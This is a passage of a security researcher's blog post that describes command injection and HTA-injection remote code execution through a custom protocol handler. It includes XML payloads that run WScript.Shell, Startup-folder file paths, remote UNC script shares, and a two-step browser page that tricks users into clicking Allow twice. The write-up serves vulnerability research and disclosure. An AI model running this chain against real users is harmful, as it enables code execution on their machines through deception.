+    <span style=color:#586e75>// If the OS is not Windows, run this one.
+</span><span style=color:#586e75></span>    Process.Start(<span style=color:#2aa198>&#34;open&#34;</span>, pathOrUri);
+}
+</code></pre></div><p>If this call raises an exception (e.g., if the file does not exist) we get a
+second chance. The app runs <code>explorer.exe "URI"</code>. This is the
+programming bug, the exception handler should return and not give us this extra
+try. Depending on the payload, <code>explorer.exe</code> does something. E.g.,
+<code>explore.exe https://example.net</code> opens the website in the default browser.</p>
+<h3 id=popping-calc>Popping Calc
+<a class=header-link href=#popping-calc><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>We can do command injection here without any parameters. I have created a REPL
+at <a href=https://dotnetfiddle.net/o1mCnT target=_blank rel="noreferrer noopener">https://dotnetfiddle.net/o1mCnT</a> if you want to see the
+transformation.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=color:#719e07>using</span> System;
+                    
+<span style=color:#719e07>public</span> <span style=color:#719e07>class</span> <span style=color:#268bd2>Program</span>
+{
+    <span style=color:#719e07>public</span> <span style=color:#719e07>static</span> <span style=color:#719e07>void</span> Main()
+    {
+        Uri baseUri = <span style=color:#719e07>new</span> Uri(<span style=color:#2aa198>&#34;C:/Windows/System32/calc.exe&#34;</span>);
+        Console.WriteLine(baseUri.ToString());
+    }
+}
+</code></pre></div><p>This is the main constraint. The string must get converted to a <a href=https://docs.microsoft.com/en-us/dotnet/api/system.uri target=_blank rel="noreferrer noopener">Uri</a>.
+More, this is the <a href=https://docs.microsoft.com/en-us/dotnet/api/system.uri.-ctor#System_Uri__ctor_System_String_ target=_blank rel="noreferrer noopener">overload with only one parameter</a>. The
+second parameter is <code>dontEscape</code>, deprecated and set to <code>false</code> by default.</p>
+<p>We do not need to use the <code>file:///</code> scheme for local files. We can use the
+<a href="https://docs.microsoft.com/en-us/dotnet/api/system.uri?view=net-5.0#implicit-file-path-support" target=_blank rel="noreferrer noopener">Implicit File Path Support</a> and skip it. This is not
+part of the URI specification and it does not matter here (we can pass any
+scheme), but it's a good point to remember in case you see something in the
+future. This means all of the following are converted to
+<code>file:///C:/Windows/System32/calc.exe</code>.</p>
+<pre tabindex=0><code>C:/Windows/System32/calc.exe
+file:C:/Windows/System32/calc.exe
+file:/C:/Windows/System32/calc.exe
+file://C:/Windows/System32/calc.exe
+</code></pre><p>This script will pop calc (we can replace it with any other local executable).</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;C:/Windows/System32/calc.exe&#34;</span> <span style=color:#268bd2>/&gt;</span>
+<span style=color:#268bd2>&lt;/MyRoot&gt;</span>
+</code></pre></div>
+<h1 id=rce-rejected-code-execution>RCE: Rejected Code Execution
+<a class=header-link href=#rce-rejected-code-execution><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>So far we know we can:</p>
+<ol>
+<li>Pass command-line switches to the app from the browser.</li>
+<li>Use a script file to run calc or any other local executable.</li>
+<li>Pass remote scripts via UNC paths to the app.</li>
+</ol>
+<p>This means we can get some code execution.</p>
+<ol>
+<li>Create a script file like the one above in a remote share (e.g., <code>\\IP</code>).</li>
+<li>Run the app from the browser with these parameters:
+<ol>
+<li><code>appHandler://-script \\IP\popcalc.xml \\IP\output.txt</code></li>
+</ol>
+</li>
+<li>User clicks on the link in the browser and allows the app to run.</li>
+<li>App runs calc.</li>
+</ol>
+<p>I have documented how I created a
+<a href=/blog/2021-05-31-public-remote-file-share-in-the-cloud/ title="public remote file share in the cloud" rel=nofollow target=_blank>public remote file share in the cloud</a>
+to host the remote script. It lets you host files at <code>\\IP\path\to\file</code>
+using a static IP in an Amazon EC2 machine for less than 5 USD a month.</p>
+<p>I submitted this bug but it was rejected because
+<strong>I could run any local executable but couldn't pass parameters</strong>. We cannot
+execute remote files by using UNC paths, either. I could also pass schemes like
+<code>ms-calculator://</code> (pops calc) but I could not find any scheme in Windows that
+let me execute an arbitrary command and pass parameters (that would be a pretty
+nasty Windows 0day).
+<del>I will write a separate blog post about my adventures there.</del>
+I have some drafts that need more research to become a blog post.</p>
+<p>Here's a small console program if you want to experiment. Pass what you want as
+the first argument and see what you can execute.</p>
+<ul>
+<li><a href=https://gist.github.com/parsiya/f235882ed04c4f881064a12dc7b6be15 target=_blank rel="noreferrer noopener">https://gist.github.com/parsiya/f235882ed04c4f881064a12dc7b6be15</a></li>
+</ul>
+<h2 id=tavisos-similar-bug>TavisO's Similar Bug
+<a class=header-link href=#tavisos-similar-bug><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>At this point, I was trying to <a href=https://twitter.com/CryptoGangsta/status/1354612042200608768 target=_blank rel="noreferrer noopener">figure out how to bypass this</a>.
+I even asked <a href=https://twitter.com/taviso target=_blank rel="noreferrer noopener">TavisO</a> about
+<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=693" target=_blank rel="noreferrer noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=693</a>. He
+answered within hours. Thanks, mate.</p>
+<p>His bug is about a <a href="https://youtu.be/Cgl51ZcACLg?t=90" target=_blank rel="noreferrer noopener">localghost server</a>. TrendMicro's
+Password Manager had a local node.js server that was vulnerable to remote code
+execution. Websites could talk to the local server and run local executables
+like this:</p>
+<ul>
+<li><code>https://localhost:49155/api/openUrlInDefaultBrowser?url=c:/windows/system32/calc.exe</code></li>
+</ul>
+<p>The <code>openUrlInDefaultBrowser</code> API is almost the exact replica of what we are
+working with here. We can pass local files but no parameters.</p>
+<h1 id=rce-resurrected-code-execution>RCE: Resurrected Code Execution
+<a class=header-link href=#rce-resurrected-code-execution><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>While writing part two I was fascinated by the
+<a href=/blog/2021-03-17-attack-surface-analysis-part-2-custom-protocol-handlers/#google-web-designer-command-injection-via-the-log-file title="Google Web Designer Command Injection via The Log File" rel=nofollow target=_blank>Google Web Designer bug</a>
+rgod could inject text into a log file at a chosen local path. They injected
+JScript into an HTA in the administrator's startup directory and got remote
+code execution.</p>
+<p>My Spidey senses started tingling. I could do the same. Let's review the
+vulnerable command-line switches:</p>
+<ul>
+<li><code>-script scriptSource.xml output.xml</code></li>
+<li><code>-debug  scriptSource.xml output.xml server username password</code></li>
+</ul>
+<p>So far, we have only looked at the script file. The second parameter is
+<code>output.xml</code>. This is just a normal text file and can be a local path that we
+can choose. It stores the output of the script. Let's see what we can inject in
+it. I passed an XML file with the correct root tag but a script tag from rgod's
+proof-of-concept:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+    <span style=color:#268bd2>&lt;script&gt;</span>var x=new ActiveXObject(&#34;WScript.Shell&#34;);x.Exec(&#34;calc.exe&#34;);<span style=color:#268bd2>&lt;/script&gt;</span>
+<span style=color:#268bd2>&lt;/MyRoot&gt;</span>
+</code></pre></div><p>And then run the app:</p>
+<ul>
+<li><code>appHandler://-script resurrected-test-injection.xml resurrected-test-output.hta</code></li>
+</ul>
+<p>The output file contains the stack trace and the
+<strong>exact line with the error as-is</strong>. BINGO!!1!!</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs>Script Failed:
+    System.InvalidOperationException: Unknown tag: script
+   at [redacted]
+
+Current Step:
+    &lt;script&gt;<span style=color:#dc322f>var</span> x=<span style=color:#719e07>new</span> ActiveXObject(<span style=color:#2aa198>&#34;WScript.Shell&#34;</span>);x.Exec(<span style=color:#2aa198>&#34;calc.exe&#34;</span>);&lt;/script&gt;
+</code></pre></div><p>The application does not recognize the <code>script</code> tag (it's not one of the
+commands) and helpfully prints the complete line with the error. If I double
+click the HTA file that I just injected then calc starts.</p>
+<span class=caption-wrapper>
+<img class=caption src=01-hta-with-calc.png title="Injected HTA executed" alt="Injected HTA executed">
+<span class=caption-text>Injected HTA executed</span>
+</span>
+<p><strong>A huge advantage of this method over the previous is being able to pass
+parameters</strong>. E.g., the following is a very convoluted way of showing a
+second command prompt that does not close after execution. I actually spent an
+hour trying to make this happen (lol):</p>
+<p><code>x.Exec("cmd.exe /k start cmd.exe /k echo 'hello world'")</code>.</p>
+<h2 id=exploitation>Exploitation
+<a class=header-link href=#exploitation><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>We can use rgod's method. They injected the HTA into the
+administrator's startup directory. I could do something similar with:</p>
+<pre tabindex=0><code>appHandler://-script resurrected-test-injection.xml
+  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/injected.hta
+</code></pre><p>This has some limitations. We need to know the username of the target or the
+user must be local admin (not necessarily the <code>Administrator</code> user because other
+local admins can write to that path, too).</p>
+<p>I tried using the <code>%username%</code> environment variable and passed
+<code>C:/Users/%username%/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/injected.hta</code>
+for the output file but the app did not resolve the environment variable. It did
+not work here but might work in another app so it's good to know.</p>
+<span class=caption-wrapper>
+<img class=caption src=02-env-var-error.png title="Environment variable error" alt="Environment variable error">
+<span class=caption-text>Environment variable error</span>
+</span>
+<p>I felt like I had a good proof-of-concept, but I wanted to do more. I can
+execute single binaries on the file system, why not inject the HTA in one
+command then execute it with another? Something like:</p>
+<p><code>appHandler://-script \\IP\resurrected-exploit-1.xml C:/ProgramData/app/inject.hta</code></p>
+<p>Where <code>resurrected-exploit-1.xml</code> is:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+    <span style=color:#268bd2>&lt;script&gt;</span>var x=new ActiveXObject(&#34;WScript.Shell&#34;);x.Exec(&#34;calc.exe&#34;);<span style=color:#268bd2>&lt;/script&gt;</span>
+    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;C:/ProgramData/app/inject.hta&#34;</span><span style=color:#268bd2>&gt;</span>
+<span style=color:#268bd2>&lt;/MyRoot&gt;</span>
+</code></pre></div><p>The first line injects the HTA and the second line exploits it, pretty nifty,
+eh? WELL, one big issue. The execution is stopped after the first error. The HTA
+is written to the file system but the <code>BrowserOpen</code> line is never executed :(</p>
+<p>What if we invoke the app twice on the same web page? Instead of having two
+commands in one script we can have two different scripts (one injects and the
+second executes).</p>
+<p><code>appHandler://-script \\IP\inject-HTA.xml C:/ProgramData/app/inject.hta</code></p>
+<p>The script just injects the HTA:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+    <span style=color:#268bd2>&lt;script&gt;</span>var x=new ActiveXObject(&#34;WScript.Shell&#34;);x.Exec(&#34;calc.exe&#34;);<span style=color:#268bd2>&lt;/script&gt;</span>
+<span style=color:#268bd2>&lt;/MyRoot&gt;</span>
+</code></pre></div><p>The second execution runs the injected HTA.</p>
+<p><code>appHandler://-script \\IP\run-HTA.xml \\IP\did-it-execute.txt</code></p>
+<p>The script executes the injected HTA and writes the output to our shared server
+(optional).</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#268bd2>&lt;MyRoot&gt;</span>
+    <span style=color:#268bd2>&lt;BrowserOpen</span> URI=<span style=color:#2aa198>&#34;C:/ProgramData/app/inject.hta&#34;</span><span style=color:#268bd2>&gt;</span>
+<span style=color:#268bd2>&lt;/MyRoot&gt;</span>
+</code></pre></div><p>We can do this on one HTML page with JavaScript. Assigning the protocol handler
+URI to <code>window.location</code> is the same as clicking it.</p>
+<pre tabindex=0><code>1. window.location=String.raw`appHandler://-script \\IP\inject-HTA.xml C:/ProgramData/app/inject.hta`
+2. User needs to click allow. The app runs. HTA is injected.
+3. Wait 10 seconds and then show an alert popup.
+4. window.location=String.raw`appHandler://-script \\IP\run-HTA.xml \\IP\did-it-execute.txt`
+5. User clicks allow. The app runs. HTA is executed
+6. ???
+7. Profit
+</code></pre><p>The user needs to click <code>Allow</code> to run the app twice but chances are the user
+will think the app did not launch properly. We can show an alert box after the
+execution to claim the execution was not successful and we will try again to
+trick the user into doing it again.</p>
+<span class=caption-wrapper>
+<img class=caption src=03-powerglove-rce.jpg title="Source: My Nintendo Power Glove manual" alt="Source: My Nintendo Power Glove manual">
+<span class=caption-text>Source: My Nintendo Power Glove manual</span>
+</span>
+<h2 id=user-gesture-required>User Gesture Required
+<a class=header-link href=#user-gesture-required><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>This also has the advantage of bypassing Chromium "user gesture required"
+errors. In short, after the first protocol handler, the user must do something
+other than clicking allow otherwise, the second protocol handler does not
+start and we see this error in the console
+<code>Not allowed to launch 'appHandler://blah' because a user gesture is required.</code></p>
+<p><a href=https://twitter.com/AlesandroOrtizR target=_blank rel="noreferrer noopener">Alesandro</a> was kind enough to explain it to me
+on <a href=https://twitter.com/CryptoGangsta/status/1377716233705955330 target=_blank rel="noreferrer noopener">Twitter (expand the whole thread)</a>.</p>
+<h1 id=what-did-we-learn-here-today>What Did We Learn Here Today?
+<a class=header-link href=#what-did-we-learn-here-today><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><ol>
+<li>Read other people's bugs. It seems like everything I do is essentially a mix
+of public bugs.</li>
+<li>User gesture stuff in Chromium.</li>
+<li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.uri?view=net-5.0#implicit-file-path-support" target=_blank rel="noreferrer noopener">Implicit File Path Support</a> which allows us not to
+include the <code>file:///</code> scheme and let the library transform it to the local
+path.</li>
+<li><code>%username%</code> and <code>%appdata%</code> environment variables are useful if the app
+resolves them.</li>
+</ol>
+</div>
+<footer>
+<p class=meta>
+<span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
+<time>Sep 26, 2021</time>
+</span>
+</p>
+<p class=meta>
+<a class="basic-alignment left" href=https://parsiya.net/blog/2021-07-30-the-thick-client-vulns-that-werent/ title="The Thick Client Vulns That Weren't">The Thick Client Vulns That Weren't</a>
+<a class="basic-alignment right" href=https://parsiya.net/blog/2021-10-11-modify-gitlab-repositories-from-the-ci-pipeline/ title="Modify GitLab Repositories from the CI Pipeline">Modify GitLab Repositories from the CI Pipeline</a>
+</p>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//parsiya.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</footer>
+</article>
+</div>
+<aside class="sidebar thirds">
+<section class="first odd">
+<h1>Who am I?</h1>
+<p>
+<p>I am Parsia, a senior security engineer at <a href=https://www.ea.com/security>Electronic Arts</a>.</p>
+<p>I write about application security, reverse engineering,
+Go, cryptography, and (obviously) videogames.</p>
+<p>Click on <a href=/about/>About Me!</a> to know more.</p>
+</p>
+</section>
+<ul class=sidebar-nav>
+<li class=sidebar-nav-item>
+<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://keybase.io/parsiya/ title=https://keybase.io/parsiya/><i class="fa fa-keybase fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a>
+</li>
+</ul>
+<section class=odd>
+<h1>Collections</h1>
+<li>
+<a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/go/ title=Go/Golang>Go/Golang</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/blockchain/ title=Blockchain>Blockchain</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a>
+</li>
+<li>
+<a href=https://parsiya.net/categories/winappdbg/ title=WinAppDbg>WinAppDbg</a>
+</li>
+<li>
+<a href=https://awsome.pw title="AWSome.pw - S3 bucket squatting - my very legit branded vulnerability">AWSome.pw - S3 bucket squatting - my very legit branded vulnerability</a>
+</li>
+</section>
+</aside>
+</div>
+</div>
+<footer role=contentinfo>
+<p>Copyright &copy; 2022 Parsia - <a href=https://parsiya.net/license/>License</a> -
+<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.
+</p>
+</footer>
+</body>
+</html>
